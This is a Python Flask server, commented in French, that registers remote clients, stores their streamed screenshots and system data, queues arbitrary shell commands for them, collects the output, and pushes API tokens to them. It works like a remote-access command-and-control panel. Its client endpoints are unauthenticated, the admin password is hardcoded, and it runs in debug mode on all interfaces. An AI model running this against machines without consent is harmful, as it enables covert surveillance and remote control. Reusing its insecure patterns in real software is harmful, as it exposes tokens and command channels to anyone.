from flask import Flask, json, jsonify, request, send_from_directory, Response
import sqlite3
import subprocess
import base64
import io
from PIL import Image
import time
import os
import threading
from functools import wraps

app = Flask(__name__)

# Configuration de l'authentification
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'votre_mot_de_passe_secret'  # À changer pour votre propre mot de passe

DATABASE = 'clients.db'
SCREENSHOT_FOLDER = 'screenshots'
UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), SCREENSHOT_FOLDER)
TIMEOUT_SECONDES = 60  # Définir le délai après lequel un client est considéré comme déconnecté (ici 60 secondes)

# Fonction pour l'authentification HTTP Basic
def auth_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return Response(
                'Accès refusé', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row # Permet d'accéder aux colonnes par nom
    return conn

def init_db():
    conn = get_db_connection()
    with app.open_resource('schema.sql', mode='r') as f: # On va créer un fichier schema.sql à l'étape suivante
        conn.cursor().executescript(f.read())
    conn.commit()
    conn.close()

@app.cli.command('initdb') # Pour initialiser la base de données avec la commande flask initdb
def initdb_command():
    """Initialise la base de données."""
    init_db()
    print('Base de données initialisée.')


@app.route('/clients', methods=['GET'])
@auth_required
def get_clients():
    conn = get_db_connection()
    clients = conn.execute('SELECT * FROM clients').fetchall()
    conn.close()
    clients_list = []
    for client in clients:
        clients_list.append(dict(client)) # Convertir sqlite3.Row en dictionnaire
    return jsonify(clients_list)

@app.route('/client/checkin', methods=['POST'])
def client_checkin():
    data = request.get_json()
    if not data or 'name' not in data or 'os_type' not in data:
        return jsonify({'message': 'Données invalides'}), 400

    name = data['name']
    os_type = data['os_type']

    conn = get_db_connection()
    client = conn.execute('SELECT id FROM clients WHERE name = ?', (name,)).fetchone()

    if client: # Client déjà enregistré, on met à jour le timestamp de connexion
        conn.execute('UPDATE clients SET last_checkin = ?, is_connected = ? WHERE id = ?', (int(time.time()), True, client['id']))
        client_id = client['id']
    else: # Nouveau client, on l'enregistre
        cur = conn.cursor()
        cur.execute('INSERT INTO clients (name, os_type, last_checkin, is_connected) VALUES (?, ?, ?, ?)',
                    (name, os_type, int(time.time()), True))
        client_id = cur.lastrowid

    conn.commit()
    conn.close()
    return jsonify({'message': 'Check-in réussi', 'client_id': client_id}), 200

@app.route('/client/<int:client_id>/screenshot', methods=['POST'])
def receive_screenshot(client_id):
    app.logger.debug(f"Received screenshot request from client {client_id}") # Log

    if 'screenshot' not in request.files:
        app.logger.warning("No screenshot file found in request") # Log
        return jsonify({'message': 'Pas de screenshot reçu'}), 400

    screenshot_file = request.files['screenshot']
    try:
        if not os.path.exists(UPLOAD_FOLDER):
            os.makedirs(UPLOAD_FOLDER)
            app.logger.info(f"Created directory: {UPLOAD_FOLDER}") # Log

        filename = f"client_{client_id}_latest.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        screenshot_file.save(filepath)
        app.logger.info(f"Screenshot saved to: {filepath}") # Log

        conn = get_db_connection()
        conn.execute('UPDATE clients SET last_screenshot_path = ? WHERE id = ?', (filepath, client_id))
        conn.commit()
        conn.close()
        app.logger.info(f"Screenshot path updated in database for client {client_id}") # Log
        return jsonify({'message': 'Screenshot reçu et enregistré (live video)'}), 200

    except Exception as e:
        app.logger.error(f"Error processing screenshot: {e}") # Log the error
        return jsonify({'message': f'Erreur lors de l\'enregistrement du screenshot: {str(e)}'}), 500

@app.route('/client/<int:client_id>/command', methods=['POST'])
@auth_required
def execute_command_on_client(client_id):
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({'message': 'Commande non spécifiée'}), 400

    command = data['command']
    command_id = data.get('command_id')
    button_type = data.get('button_type', 'Manual')  # 'Manual' par défaut si non spécifié
    
    # On stocke la commande et son id sous forme de JSON
    import json as _json
    command_payload = _json.dumps({'command': command, 'command_id': command_id})
    conn = get_db_connection()
    
    # Enregistrer la commande dans l'historique
    conn.execute(
        'INSERT INTO command_history (client_id, command, command_id, button_type, status) VALUES (?, ?, ?, ?, ?)',
        (client_id, command, command_id, button_type, 'pending')
    )
    
    conn.execute('UPDATE clients SET command_to_execute = ? WHERE id = ?', (command_payload, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Commande enregistrée pour exécution par le client'}), 200

@app.route('/client/<int:client_id>/token', methods=['POST'])
@auth_required
def Put_API_on_client(client_id):
    data = request.get_json()
    if not data or 'token' not in data:
        return jsonify({'message': 'API non spécifiée'}), 400

    token = data['token']
    print(token)
    conn = get_db_connection()
    conn.execute('UPDATE clients SET add_api_key = ? WHERE id = ?', (token, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'API enregistrée pour exécution par le client'}), 200





@app.route('/client/<int:client_id>/getcommand', methods=['GET'])
def get_command_for_client(client_id):
    """Récupère la commande à exécuter pour un client et la supprime de la base de données."""
    conn = get_db_connection()
    client = conn.execute('SELECT command_to_execute FROM clients WHERE id = ?', (client_id,)).fetchone()
    command_payload = client['command_to_execute'] if client else None

    if command_payload:
        # Une fois la commande récupérée, on la supprime de la base de données pour ne pas la réexécuter
        conn.execute('UPDATE clients SET command_to_execute = ? WHERE id = ?', (None, client_id))
        conn.commit()
        conn.close()
        import json as _json
        try:
            payload = _json.loads(command_payload)
        except Exception:
            payload = {'command': command_payload, 'command_id': None}
        return jsonify(payload), 200
    else:
        conn.close()
        return jsonify({'command': None, 'command_id': None}), 200


@app.route('/client/<int:client_id>/token', methods=['GET'])
def get_api_for_client(client_id):
    """Récupère la API pour un client et la suprime de la base de données."""
    conn = get_db_connection()
    client = conn.execute('SELECT add_api_key FROM clients WHERE id = ?', (client_id,)).fetchone()
    api = client['add_api_key'] if client else None

    return jsonify({'api': api}), 200
    # if command:
    #     # Une fois la commande récupérée, on la supprime de la base de données pour ne pas la réexécuter
    #     conn.execute('UPDATE clients SET add_api_key  = ? WHERE id = ?', (None, client_id))
    #     conn.commit()
    #     conn.close()
    #     return jsonify({'api': api}), 200
    # else:
    #     conn.close()
    #     return jsonify({'api': None}), 200



@app.route('/client/<int:client_id>/disconnect', methods=['POST'])
def disconnect_client(client_id):
    """Déconnecte un client en mettant à jour son statut dans la base de données."""
    conn = get_db_connection()
    conn.execute('UPDATE clients SET is_connected = ? WHERE id = ?', (False, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': f'Client ID {client_id} déconnecté.'}), 200


app.static_folder = 'frontend'

@app.route('/')
@auth_required
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
@auth_required
def serve_static_files(path):
    return send_from_directory(app.static_folder, path)

@app.route('/screenshots/<filename>') # Nouvelle route pour servir les screenshots
@auth_required
def serve_screenshot(filename):
    return send_from_directory(UPLOAD_FOLDER, filename) # Utiliser UPLOAD_FOLDER

@app.route('/client/<int:client_id>/commandresult', methods=['POST'])
def receive_command_result(client_id):
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    # On s'assure que command_id est bien stocké avec le résultat
    conn = get_db_connection()
    import json as _json
    
    # Mettre à jour l'historique avec le résultat
    command_id = data.get('command_id')
    stdout = data.get('stdout', '')
    stderr = data.get('stderr', '')
    status = 'success' if not stderr or stderr.strip() == '' else 'error'
    
    if command_id:
        conn.execute(
            'UPDATE command_history SET status = ?, stdout = ?, stderr = ? WHERE client_id = ? AND command_id = ?',
            (status, stdout, stderr, client_id, command_id)
        )
    
    conn.execute('UPDATE clients SET command_output = ? WHERE id = ?', 
                (_json.dumps(data), client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Résultat de commande enregistré'}), 200

@app.route('/client/<int:client_id>/commandresult', methods=['GET'])
@auth_required
def get_command_result(client_id):
    conn = get_db_connection()
    client = conn.execute('SELECT command_output FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    import json as _json
    if client and client['command_output']:
        return jsonify({'output': _json.loads(client['command_output'])}), 200
    else:
        return jsonify({'output': None}), 200

@app.route('/client/<int:client_id>', methods=['GET'])
@auth_required
def get_client_by_id(client_id):
    """Get client details by ID."""
    conn = get_db_connection()
    client = conn.execute('SELECT id, name, os_type, is_connected FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    
    if client:
        return jsonify(dict(client)), 200
    else:
        return jsonify({'error': 'Client not found'}), 404

def verifier_deconnexions():
    """Fonction exécutée périodiquement pour vérifier si des clients sont déconnectés."""
    with app.app_context(): # Créer un contexte d'application Flask pour accéder à la base de données
        conn = get_db_connection()
        clients = conn.execute('SELECT id, last_checkin, is_connected FROM clients').fetchall()
        now = int(time.time())

        for client in clients:
            if client['is_connected']: # Vérifier uniquement les clients actuellement marqués comme connectés
                last_checkin_time = client['last_checkin']
                if last_checkin_time is not None and (now - last_checkin_time) > TIMEOUT_SECONDES:
                    # Si le dernier check-in est plus vieux que le délai, on considère le client comme déconnecté
                    conn.execute('UPDATE clients SET is_connected = ? WHERE id = ?', (False, client['id']))
                    print(f"Client ID {client['id']} considéré comme déconnecté (timeout)") # Log pour le débogage

        conn.commit()
        conn.close()

def demarrer_verificateur_deconnexions():
    """Démarre une tâche de fond qui vérifie les déconnexions périodiquement."""
    def tache_verification():
        while True:
            verifier_deconnexions()
            time.sleep(10)  # Vérifier les déconnexions toutes les 10 secondes (ajuster si nécessaire)

    thread_verification = threading.Thread(target=tache_verification)
    thread_verification.daemon = True # Le thread s'arrête quand l'application principale s'arrête
    thread_verification.start()

@app.route('/client/<int:client_id>/resources', methods=['POST'])
def receive_resources(client_id):
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    conn = get_db_connection()
    conn.execute('UPDATE clients SET resources = ? WHERE id = ?', 
                (json.dumps(data), client_id))
    conn.commit()
    conn.close()
    
    return jsonify({'message': 'Données de ressources système enregistrées'}), 200

@app.route('/client/<int:client_id>/resources', methods=['GET'])
@auth_required
def get_resources(client_id):
    conn = get_db_connection()
    client = conn.execute('SELECT resources FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    
    if client and client['resources']:
        return jsonify({'resources': json.loads(client['resources'])}), 200
    else:
        return jsonify({'resources': None}), 200

# Nouvelle route pour récupérer l'historique des commandes
@app.route('/client/<int:client_id>/command_history', methods=['GET'])
@auth_required
def get_command_history(client_id):
    conn = get_db_connection()
    
    # Option pour filtrer par type de bouton
    button_type = request.args.get('button_type')
    
    if button_type:
        history = conn.execute(
            'SELECT * FROM command_history WHERE client_id = ? AND button_type = ? ORDER BY timestamp DESC LIMIT 100',
            (client_id, button_type)
        ).fetchall()
    else:
        history = conn.execute(
            'SELECT * FROM command_history WHERE client_id = ? ORDER BY timestamp DESC LIMIT 100',
            (client_id,)
        ).fetchall()
    
    conn.close()
    
    # Convertir les résultats en liste de dictionnaires
    history_list = []
    for item in history:
        history_list.append(dict(item))
    
    return jsonify(history_list), 200

if __name__ == '__main__':
    # Initialiser la base de données si elle n'existe pas
    if not os.path.exists(DATABASE):
        init_db()
        print('Base de données initialisée au démarrage.')
        
    demarrer_verificateur_deconnexions() # Démarrer le vérificateur de déconnexions au lancement du serveur
    app.run(host='0.0.0.0', debug=True) # debug=True pour le développement, à retirer en production